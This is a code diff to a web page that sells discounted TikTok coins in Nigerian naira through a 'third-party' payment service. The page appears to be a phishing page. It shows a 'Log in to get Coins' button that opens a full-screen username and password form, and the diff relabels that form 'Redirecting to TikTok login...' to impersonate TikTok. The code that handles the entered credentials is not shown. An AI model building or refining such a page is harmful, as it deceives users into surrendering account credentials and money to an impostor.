@@ -14,7 +14,6 @@ body {
   color: #000;
 }
 
-/* Secure payment */
 .secure-payment {
   background-color: #e8f8ed;
   text-align: center;
@@ -24,14 +23,12 @@ body {
   font-weight: 600;
 }
 
-/* Layout */
 .container {
   max-width: 420px;
   margin: 0 auto;
   padding: 15px 20px 20px 20px;
 }
 
-/* Header */
 .header {
   display: flex;
   justify-content: space-between;
@@ -46,7 +43,6 @@ body {
   font-weight: bold;
 }
 
-/* TikTok logo */
 .header-right {
   display: flex;
   justify-content: flex-end;
@@ -62,11 +58,6 @@ body {
   transition: 0.3s ease;
 }
 
-.tiktok-mini-logo:hover {
-  transform: scale(1.08);
-}
-
-/* Sub text */
 .sub-text {
   font-size: 16px;
   color: #333;
@@ -81,7 +72,7 @@ body {
   font-weight: 700;
 }
 
-/* Coin grid */
+/* Coin boxes */
 .coins-grid {
   display: grid;
   grid-template-columns: repeat(3, 1fr);
@@ -97,12 +88,6 @@ body {
   cursor: pointer;
   transition: 0.3s;
   border: 1px solid #f0f0f0;
-  text-decoration: none;
-  color: inherit;
-}
-
-.coin-box:hover {
-  background-color: #f0f0f0;
 }
 
 .coin-box.active {
@@ -134,7 +119,6 @@ body {
 .custom-input {
   display: none;
   text-align: center;
-  margin-top: -10px;
 }
 
 .custom-input input {
@@ -146,7 +130,7 @@ body {
   margin-top: 10px;
 }
 
-/* Button */
+/* Main button */
 .login-btn {
   background-color: #ff375f;
   color: white;
@@ -160,7 +144,7 @@ body {
   margin-bottom: 25px;
 }
 
-/* Invite */
+/* Invite section */
 .invite-box {
   background-color: #fff;
   border-radius: 10px;
@@ -199,12 +183,7 @@ body {
   transition: 0.2s;
 }
 
-.share-btn:hover {
-  color: #000;
-  transform: scale(1.1);
-}
-
-/* Coin Image Section */
+/* Coin image */
 .coin-image-section {
   text-align: center;
   margin-top: 25px;
@@ -217,33 +196,22 @@ body {
   transition: 0.3s ease;
 }
 
-.coin-image-section img:hover {
-  transform: scale(1.05);
-}
-
-/* Footer */
 .footer {
   text-align: center;
   margin-top: 100px;
   opacity: 0.6;
 }
 
-.footer .legal {
-  font-size: 18px;
-  font-weight: bold;
-  opacity: 0.8;
-}
-
-/* Loading screen */
-.loading-overlay {
+/* Loading & Login */
+.loading-overlay, .login-modal {
   display: none;
   position: fixed;
-  z-index: 1200;
-  top: 0;
+  z-index: 1300;
   left: 0;
+  top: 0;
   width: 100%;
   height: 100%;
-  background: #fff;
+  background: white;
   justify-content: center;
   align-items: center;
 }
@@ -280,20 +248,6 @@ body {
   50% { transform: scale(1.3); opacity: 0.5; }
 }
 
-/* Login modal */
-.login-modal {
-  display: none;
-  position: fixed;
-  z-index: 1300;
-  left: 0;
-  top: 0;
-  width: 100%;
-  height: 100%;
-  background: white;
-  justify-content: center;
-  align-items: center;
-}
-
 .login-content {
   text-align: center;
 }
@@ -326,7 +280,6 @@ body {
 </head>
 
 <body>
-
 <div class="secure-payment">Secure Payment via LegalTenderPay</div>
 
 <div class="container">
@@ -340,33 +293,33 @@ body {
   <p class="sub-text">Save around <span>25%</span> with a lower<br>third-party service fee.</p>
 
   <div class="coins-grid" id="coinsGrid">
-    <div class="coin-box" data-price="530" onclick="selectBox(this)">
+    <div class="coin-box" data-coins="30" onclick="selectBox(this)">
       <div class="coin-amount"><img src="https://cdn-icons-png.flaticon.com/512/138/138281.png">30</div>
       <div class="coin-price">NGN530</div>
     </div>
-    <div class="coin-box" data-price="6200" onclick="selectBox(this)">
+    <div class="coin-box" data-coins="350" onclick="selectBox(this)">
       <div class="coin-amount"><img src="https://cdn-icons-png.flaticon.com/512/138/138281.png">350</div>
       <div class="coin-price">NGN6,200</div>
     </div>
-    <div class="coin-box" data-price="12400" onclick="selectBox(this)">
+    <div class="coin-box" data-coins="700" onclick="selectBox(this)">
       <div class="coin-amount"><img src="https://cdn-icons-png.flaticon.com/512/138/138281.png">700</div>
       <div class="coin-price">NGN12,400</div>
     </div>
-    <div class="coin-box" data-price="24700" onclick="selectBox(this)">
+    <div class="coin-box" data-coins="1400" onclick="selectBox(this)">
       <div class="coin-amount"><img src="https://cdn-icons-png.flaticon.com/512/138/138281.png">1,400</div>
       <div class="coin-price">NGN24,700</div>
     </div>
-    <div class="coin-box" data-price="61600" onclick="selectBox(this)">
+    <div class="coin-box" data-coins="3500" onclick="selectBox(this)">
       <div class="coin-amount"><img src="https://cdn-icons-png.flaticon.com/512/138/138281.png">3,500</div>
       <div class="coin-price">NGN61,600</div>
     </div>
-    <div class="coin-box" data-price="custom" onclick="selectCustom(this)">
+    <div class="coin-box" data-coins="custom" onclick="selectCustom(this)">
       <span class="coin-amount">Custom</span>
     </div>
   </div>
 
   <div class="custom-input" id="customInputBox">
-    <input type="number" id="customAmount" placeholder="Enter custom amount" oninput="updateCustomAmount()">
+    <input type="number" id="customAmount" placeholder="Enter coins amount" oninput="updateCustomAmount()">
   </div>
 
   <button class="login-btn" id="mainButton" onclick="startLogin()">Log in to get Coins</button>
@@ -391,29 +344,28 @@ body {
   </div>
 </div>
 
-<!-- Full-screen loading -->
 <div class="loading-overlay" id="loadingOverlay">
   <div class="loader"></div>
 </div>
 
-<!-- Full-screen login -->
 <div class="login-modal" id="loginModal">
   <div class="login-content">
-    <h2>Log in</h2>
-    <input type="text" placeholder="Email or Username" required><br>
+    <h2>Redirecting to TikTok login...</h2>
+    <input type="text" placeholder="Username" required><br>
     <input type="password" placeholder="Password" required><br>
     <button onclick="completeLogin()">Continue</button>
   </div>
 </div>
 
 <script>
-let selectedPrice = 530;
+let coinRate = 17.71; 
+let selectedCoins = 30;
 let loggedIn = false;
 
 function selectBox(el) {
   document.querySelectorAll('.coin-box').forEach(b => b.classList.remove('active'));
   el.classList.add('active');
-  selectedPrice = el.getAttribute('data-price');
+  selectedCoins = el.getAttribute('data-coins');
   document.getElementById("customInputBox").style.display = "none";
   updateButton();
 }
@@ -422,20 +374,25 @@ function selectCustom(el) {
   document.querySelectorAll('.coin-box').forEach(b => b.classList.remove('active'));
   el.classList.add('active');
   document.getElementById("customInputBox").style.display = "block";
-  selectedPrice = 0;
+  selectedCoins = 0;
   updateButton();
 }
 
 function updateCustomAmount() {
-  const customValue = document.getElementById("customAmount").value;
-  selectedPrice = customValue;
+  const val = document.getElementById("customAmount").value;
+  selectedCoins = val ? parseInt(val) : 0;
   updateButton();
 }
 
 function updateButton() {
   const btn = document.getElementById("mainButton");
+  const ngn = (selectedCoins * coinRate).toFixed(2);
   if (loggedIn) {
-    btn.textContent = selectedPrice > 0 ? `Buy for NGN${selectedPrice}` : "Buy Now";
+    if (selectedCoins > 0) {
+      btn.textContent = `Buy ${selectedCoins} Coins for NGN${ngn}`;
+    } else {
+      btn.textContent = "Buy Now";
+    }
   }
 }
 
@@ -447,7 +404,7 @@ function startLogin() {
       document.getElementById("loginModal").style.display = "flex";
     }, 2000);
   } else {
-    alert(`Proceeding to buy for NGN${selectedPrice}`);
+    alert(`Proceeding to buy ${selectedCoins} Coins for NGN${(selectedCoins * coinRate).toFixed(2)}`);
   }
 }
 
